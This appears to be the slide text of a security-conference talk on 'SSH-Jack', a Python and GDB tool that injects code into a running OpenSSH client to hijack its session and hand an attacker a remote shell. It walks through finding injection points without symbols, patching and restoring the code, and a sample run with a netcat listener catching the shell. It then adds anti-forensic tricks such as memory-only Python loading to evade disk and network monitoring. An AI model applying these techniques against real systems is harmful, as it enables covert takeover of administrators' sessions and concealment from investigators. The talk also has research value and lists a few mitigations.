– ptrace attaches to the SSH client process
How it Works (III)
– finds the virtual channel setup code
– patches it in memory to request a remote shell which 
talks to a local tcp socket instead of the user
How it Works (IV)
– alters execution flow to run the VC setup code
How it Works (V)
– restores original code & state
– continues execution as if nothing happened...
– ... except that you got pwned. 
What your mother warned you about
● Hackers are sneaky
● Hackers don't just install LRK4 and BNC any 
more (at least, the ones you don't catch)
● Good hackers display creativity (as do expensive 
pentesters... you hope)
Automated Debugging
● Of course a human with a debugger can do 
sneaky things
● We want to automate it
● GDB is good, GDB/MI (machine interface) 
passable
● Python + GDB is a good mix; ubiquitous 
scripting language, interactive shell, good 
debugger
Automated Debugging (II)
● Goal: sneakiness of a human, speed and 
portability of a script
● Less like debugging (no symbol information), 
more like bit of binary analysis mixed with a bit 
of virus technique
Details
● SSH-Jack Nitty Gritty
– Python GDB/MI
– Finding a safe place to stop the program
– Deciding where to redirect execution
– Generating code to inject
– Running it
– Restoring everything
● Discussing with specific reference to SSH-Jack, 
but techniques are general
GDB/MI
● GDB is the GNU debugger
● GDB/MI is it's programmatic interface
● Implemented gdbmi.py, python interface to GDB
● Basic functionality only, but usable. e.g:
g=gdbmi()
g.connect(pid)
g.insertBreak(breakpoint)
g.waitForBreak()
oldeip = g.getRegs()[“eip”]
g.setByte(0x0ee7beef, 0x29)
A Safe Place
● Normally single threaded, use of globals, no 
locking, so we have to be careful
● Find a safe place to run our code
– read the fine source
– probably the mainline, as close to normal as possible
● Stop the process
● Locate address of safe place
● Add a breakpoint there, easy!
● Continue execution
clientloop.c:
407: ret = select((*maxfdp)+1,
*readsetp, *writesetp, NULL, tvp);
408: if(ret > 0) {
But where is select()?
● We don't have debug 
symbols
● No problem, just a few 
more steps:
– Select() is provided by 
libc...
– Ask for the address 
where the dynamic 
linker put libc::select()
But where is select()? (II)
– Find the entry in the 
ELF Global Offset 
Table for libc::select()'s 
address
But where is select()? (III)
– Find entries in the ELF 
Procedure Linkage 
Table for the GOT 
entry
But where is select()? (IV)
– Find calls to the PLT 
entry in the code
● In this case, there's 
only one call to select 
anyway, so last step 
not required
● Just a breakpoint in 
the ELF PLT will do
Where we'll do the evil
● Find the virtual channel setup code:
– ssh.c,1150: ssh_session2_open()
● Still no debug symbols
● Has unique string: 
– “dup() in/out/err failed”
● Similar to before:
– find unique string in ELF .rodata section
– find reference to .rodata entry in .text
The Evil Itself
● Evil code will replace first half of VC setup code
● Save regs & flags before execution, restore after
● “Shellcode” to socket(); connect();
● Put a socket where SSH expects a local filehandle 
(yay for Unix!)
● Leave register state just so, stack unmangled, so 
execution continues
● Uses libc calls, not syscalls, for no good reason
The Evil Itself (II)
● Why the effort to overwrite half a function?
– Avoid runtime, by hand linking with no symbols
– SSH uses lots of globals, 'data driven' style using 
function pointer arrays, horrible to link by hand
– Minimal deviation from existing code
● Handcrafting for each SSH binary tedious
● Don't have enough info for a general solution...
● ... until runtime. So we patch one up then. 
Generating the Evil
● Work backwards from 
unique string
● Learn stack size
● Patch in command line 
parameters
● Patch stack size, PLT 
entries for socket() and 
connect() into code
Injecting the Evil
● Backup EIP
● Backup old code
● Evil code takes care of 
saving and restoring 
registers/flags
● Overwrite start of 
function() with evil
● Set breakpoint to catch 
end of evil
Running it
Saving EIP
Saved EIP 0x804ad88
Saving 92 bytes of code that we're about to overwrite at 0x0804d679
Injecting 92 bytes of stub at 0x0804d679
Clearing breakpoint
Setting new breakpoint at 0x0804d682
Setting EIP to 0x0804d679
Continuing execution.
Waiting for breakpoint...
Returned from our stub! Woot!
Restoring 92 bytes of old code that we overwrote at 0x0804d679
Clearing break
Resetting EIP
Finished cleaning up, detaching from process.
Smacking it upside the head with a SIGWINCH to wake it up...
haxor:$ nc -l -p 1337
luser@pwned:~$ echo woot!
woot!
● Clipart dude is 
playing hunt the 
Wumpus via SSH
● The Wumpus is 
still going to kill 
him
Jack yourself?
● Test your plan of attack first
– Write your hijack code in C, and compile it into the 
application
– Hook it up to some sekret keystroke, or signal or 
whatever, so you know that it's possible
– Base your 'shellcode' on what the compiler assembled
● Implement hijacking for a binary with debug 
symbols, much easier
Jack yourself? (II)
● Build a list of symbols you need to find
● Decide how you're going to find them
● Write cunning code to do so
● Jack your friends for fun and profit
● Optional: package nicely with a spinny-round-o-
vision OpenGL GUI for the kiddies and Security 
Consultants
Bits and Pieces
● Think about your SCP-push backups, your CVS, 
your rsync. SSH gets around.
● Does the jacked connection show up in the list?
● What happens when they log out?
● Should work on any OpenSSH 3.x ish
● Current code known to work on Debian Sarge, 
RHEL3, RH9
● SuSE's GCC is nuts. I'm amazed it runs at all.
Tangent: Anti-forensic Technique
● Moving fast, not stopping to rootkit everything 
assumes you're taking Precautions
● Go and see the Grugq's talk. Really. It has 
FISTing.
● A brief summary
● How we apply anti-forensic technique in the 
SSH-Jacker
Anti-Forensic Technique
● No code on disk == no tripwire, no encase
– everything in memory only
● Use local tools/interpreters only
– all they'll know is that you did something, not what
– write your tools on the spot as you need them
● No new network connections for an IDS to spot
– reuse your existing connection
– hide in plain sight
● Encrypt everything so packet logs are useless
How we implement AF principles
● Some bits are good already:
– We use general purpose tools:
● python
● GDB
– SSH is encrypted to start with
– We're sneaking down an existing connection
How we fail to implement AF
● Some bits not so good
– python code lying around on disk for people to read
– new connection from the SSH client to us to give us 
our shell...
– ...which is also in the clear
● We need to try harder
– SSH port forward incoming shell back down 
encrypted session
Loading Python directly into memory
● Compile python bytecode locally, compress it, 
base64 encode for 7bit cleanliness
● Generate stub that will unpack and run the above
● Send both across your shell
$ python -c 'import sys
while 1: 
exec sys.stdin.readline()'
● Run a python 
interpreter, tell it to 
read python on stdin, 
and run it
MAFL-Load
● Doesn't sound easy enough? How about a skript?
– mafl-load script.py [args]
– Does all the previous, in one easy step
● I hack in Screen, which rocks even more
– Ctrl-A:!!!!mafl-load ssh-jack pid
– Injects output of mafl-load into my remote shell, and 
runs it. Ahh, the Joy of Unix.
● You can almost forget that you're doing it
Improvements, Future Direction
● Runtime assembler with Mosdef or similar
● Pure python debugger, remove GDB dependency
● Do it to MSRDP, or Citrix ICA
● All manner of domain-specific sneakiness; a 
programmatic debugging toolkit is a useful thing 
to have in your box of tricks
Is this Theo de Raadt's Fault?
● Hell no, it's a feature!
● SSH Protocol spec says multiple shells are fine
● Server-to-client shells would be...
● ... except they took care of that
● and unsolicited server-to-client port-forwarding 
● Other SSH client/server implementations might 
be different.
● And anyway, OpenSSH is cool. Props to them.
Mitigation Technique
● Uhh, don't get rooted
● Patch kernel to restrict ptrace() to root
● Ensure that any SSH trusts you do have are 
restrictive
– command=”stuff”,no-port-forwarding,permit-
open=”host:port”
● Give debuggers the whole Steve Gibson Raw-
Sockets-Are-Evil treatment!
Why You Should(n't) Care
● Nothing you didn't - even if you repressed it -
already know
● If you get rooted, you're screwed. But you knew 
that.
● Rich desktops make attacking admins to get to 
servers a good route
● This technique is useful against any client, but 
protocols with VC arch are the best – MSRDP, 
Citrix ICA...
Hackers Made Me Do It
● Ruxcon (Sydney) 2k3 and 4 inspiration
– Grugq: antiforensic shaolin master
– Shaun Clowes: the holy-crap-wtf-insane Shiva ELF 
encryptor
– Silvio Cesare: linux vx godfather
● Mad greetz to:
– NZISIG, NZ2600, SLi, and the rest of what passes for 
a Scene in NZ. 
– Gnuspice for giving me a copy of Cheswick and 
Bellovin many years ago.
Q&A
● Shred me and my lameitude
Spam me
● PI:EMAIL